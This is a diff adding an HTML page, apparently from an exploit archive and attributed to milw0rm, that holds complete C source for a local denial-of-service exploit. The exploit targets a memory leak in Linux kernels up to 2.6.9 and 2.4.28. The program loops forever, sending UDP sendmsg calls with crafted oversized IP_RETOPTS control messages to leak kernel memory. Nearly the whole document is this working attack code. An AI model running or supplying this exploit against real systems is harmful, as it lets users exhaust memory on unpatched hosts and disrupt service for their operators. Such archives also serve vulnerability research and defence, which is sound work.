@@ -1,0 +1,89 @@
+<html>
+<head>
+<title>Linux Kernel <= 2.6.9, <= 2.4.28 Memory Leak Local DoS</title>
+<pre>
+/* memory leak
+ * Copyright Georgi Guninski
+ * Cannot be used in vulnerability databases (like securityfocus and mitre)
+ * */
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(int ac,char **av)
+{
+struct msghdr msghdr;
+struct iovec iovector[10];
+int i,s,j,ma;
+struct sockaddr_in sockad; 
+char msg[128];
+struct cmsghdr *cmsg,*cm2; 
+char opts[24];
+
+ma=250;
+printf(&quot;just wait and watch memory usage\n&quot;);
+
+memset(opts,0,sizeof(opts));
+
+while(42)
+{
+s=socket(PF_INET, /*SOCK_STREAM*/ SOCK_DGRAM, 0);
+sockad.sin_family = AF_INET;
+sockad.sin_addr.s_addr=inet_addr(&quot;127.0.0.1&quot;);
+sockad.sin_port=htons(8080); 
+
+connect(s,(struct sockaddr *) &amp;sockad, sizeof(sockad)); 
+
+memset(msg,'v',sizeof(msg));
+#define VV (ma*(sizeof(struct cmsghdr)+sizeof(opts))+1024*1024)
+cmsg = malloc(VV);
+memset(cmsg,0,VV);
+cmsg-&gt;cmsg_len = sizeof(struct cmsghdr) + sizeof(opts);
+cmsg-&gt;cmsg_level = SOL_IP;
+cmsg-&gt;cmsg_type = IP_RETOPTS;
+memcpy(CMSG_DATA(cmsg), opts, sizeof(opts));
+
+cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cmsg)+sizeof(opts));
+for(j=0;j&lt;ma;j++)
+{
+cm2-&gt;cmsg_level = SOL_IP;
+cm2-&gt;cmsg_type = IP_RETOPTS;
+cm2-&gt;cmsg_len =  sizeof(struct cmsghdr) + sizeof(opts); 
+cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cm2)+sizeof(opts));
+}
+
+cm2-&gt;cmsg_level = SOL_IP;
+cm2-&gt;cmsg_type = IP_RETOPTS;
+cm2-&gt;cmsg_len =  sizeof(struct cmsghdr) + 8; 
+
+msghdr.msg_name = &amp;sockad;
+msghdr.msg_namelen = sizeof(sockad);
+
+msghdr.msg_control=cmsg;
+msghdr.msg_controllen= cmsg-&gt;cmsg_len + (j)*cmsg-&gt;cmsg_len+cm2-&gt;cmsg_len;  
+msghdr.msg_iov = iovector;
+
+msghdr.msg_iovlen = 1;
+iovector[0].iov_base = msg;
+iovector[0].iov_len = sizeof(msg);
+
+if ((i = sendmsg(s, &amp;msghdr, 0)) &lt; 0)
+{perror(&quot;sendmsg&quot;);return -42;}
+
+close(s);
+free(cmsg);
+}
+return 42;
+}
+
+// milw0rm.com [2004-12-16]
+</pre>
+</html>
+
